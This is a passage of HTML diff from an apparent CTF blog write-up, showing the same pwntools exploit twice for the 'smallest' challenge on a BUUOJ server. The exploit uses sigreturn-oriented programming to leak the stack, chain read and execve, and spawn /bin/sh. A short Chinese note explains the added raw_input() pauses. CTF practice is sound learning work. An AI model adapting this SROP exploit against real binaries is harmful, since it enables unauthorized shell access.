-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class=" language-lang-python"><code class="language-lang-python">from pwn import *
-#p=process('./smallest')
-p=remote('node4.buuoj.cn',29807)
-elf=ELF('./smallest')
-context.arch='amd64'
-context.log_level='debug'
-syscall_ret=0x0004000BE
-start_addr=0x0004000B0
-payload=p64(start_addr)*3
-yes = raw_input()
-p.send(payload)
-yes = raw_input()
-p.send('\xb3')
-yes = raw_input()
-stack_addr=u64(p.recv()[8:16]) 
-print("leak the stack addr:",hex(stack_addr))
-
-read=SigreturnFrame()
-read.rax=constants.SYS_read 
-read.rdi=0
-read.rsi=stack_addr
-read.rdx=0x400
-read.rsp=stack_addr
-read.rip=syscall_ret
-payload=p64(start_addr)+p64(syscall_ret)+str(read)
-p.send(payload)
-yes = raw_input()
-p.send(payload[8:8+15])
-yes = raw_input()
-
-execve=SigreturnFrame()
-execve.rax=constants.SYS_execve
-execve.rdi=stack_addr+0x120
-execve.rsi=0x0
-execve.rdx=0x0
-execve.rsp=stack_addr
-execve.rip=syscall_ret
-
-payload=p64(start_addr)+p64(syscall_ret)+str(execve)
-print("len(payload)=",len(payload))
-payload=payload+(0x120-len(payload))*'\x00'+'/bin/sh\x00'
-p.send(payload)
-yes = raw_input()
-p.send(payload[8:8+15])
-p.interactive()
-</code></pre>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./smallest&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29807</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">syscall_ret=<span class="number">0x0004000BE</span></span><br><span class="line">start_addr=<span class="number">0x0004000B0</span></span><br><span class="line">payload=p64(start_addr)*<span class="number">3</span></span><br><span class="line">yes = raw_input()</span><br><span class="line">p.send(payload)</span><br><span class="line">yes = raw_input()</span><br><span class="line">p.send(<span class="string">&#x27;\xb3&#x27;</span>)</span><br><span class="line">yes = raw_input()</span><br><span class="line">stack_addr=u64(p.recv()[<span class="number">8</span>:<span class="number">16</span>]) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak the stack addr:&quot;</span>,<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">read=SigreturnFrame()</span><br><span class="line">read.rax=constants.SYS_read </span><br><span class="line">read.rdi=<span class="number">0</span></span><br><span class="line">read.rsi=stack_addr</span><br><span class="line">read.rdx=<span class="number">0x400</span></span><br><span class="line">read.rsp=stack_addr</span><br><span class="line">read.rip=syscall_ret</span><br><span class="line">payload=p64(start_addr)+p64(syscall_ret)+<span class="built_in">str</span>(read)</span><br><span class="line">p.send(payload)</span><br><span class="line">yes = raw_input()</span><br><span class="line">p.send(payload[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>])</span><br><span class="line">yes = raw_input()</span><br><span class="line"></span><br><span class="line">execve=SigreturnFrame()</span><br><span class="line">execve.rax=constants.SYS_execve</span><br><span class="line">execve.rdi=stack_addr+<span class="number">0x120</span></span><br><span class="line">execve.rsi=<span class="number">0x0</span></span><br><span class="line">execve.rdx=<span class="number">0x0</span></span><br><span class="line">execve.rsp=stack_addr</span><br><span class="line">execve.rip=syscall_ret</span><br><span class="line"></span><br><span class="line">payload=p64(start_addr)+p64(syscall_ret)+<span class="built_in">str</span>(execve)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;len(payload)=&quot;</span>,<span class="built_in">len</span>(payload))</span><br><span class="line">payload=payload+(<span class="number">0x120</span>-<span class="built_in">len</span>(payload))*<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">yes = raw_input()</span><br><span class="line">p.send(payload[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>])</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <blockquote>
 <p> WIKI原本的exp是没办法在BUU的环境里通过的，查阅后发现似乎是因为过快的发送速度会导致read返回的值出现波动，于是使用raw_input()l在每个发送数据后断开以保证其有正确的值，然后就能通过了</p>
 </blockquote>
